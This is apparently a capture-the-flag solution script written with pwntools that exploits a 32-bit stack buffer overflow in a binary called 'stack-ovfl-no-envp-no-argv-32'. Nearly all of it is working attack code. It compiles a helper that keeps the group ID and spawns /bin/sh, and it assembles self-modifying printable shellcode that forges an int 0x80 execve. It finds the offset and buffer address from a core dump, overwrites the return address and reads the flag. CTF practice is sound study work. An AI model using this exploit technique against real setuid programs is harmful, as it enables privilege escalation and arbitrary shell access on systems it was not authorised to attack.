from pwn import *
import os

DEBUG = False 

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
push   ebp
pop    edx # store ebp in edx

push   0x31 # zero eax
pop    eax
xor    al, 0x31
dec    eax # gets us ff

xor [edx + 0x1e], al
xor [edx + 0x1f], al

push 0x7a # push z on the stack
push esp
pop  ebx

push 0x31
pop  eax
xor  al, 0x31
push eax
push eax
pop  ecx
pop  edx

push 0xb
pop  eax

.dc.b 0x32, 0x7f # these ^ ff = int 0x80
''') 


print(disasm(shellcode))

env = {"PATH":"$PATH:."}
file = './stack-ovfl-no-envp-no-argv-32'
shellcode_file = f'./{shellcode.decode("utf8")}'
if not os.path.isfile(shellcode_file):
    os.symlink(file, shellcode_file)


# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(shellcode_file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
shellcode_address = core.stack.find(shellcode)
print(shellcode_address)
# shellcode_address = 0xffffdf9b
max_len = cyclic(10000).find(p32(core.fault_addr))
print(max_len)
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(shellcode_file, env=env, gdbscript='''
b main
b *0x08048546
continue
''')
else:
    io = process(shellcode_file, env=env)

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


payload = int(max_len / 4) * p32(shellcode_address) + p32(shellcode_address)
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Hello', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
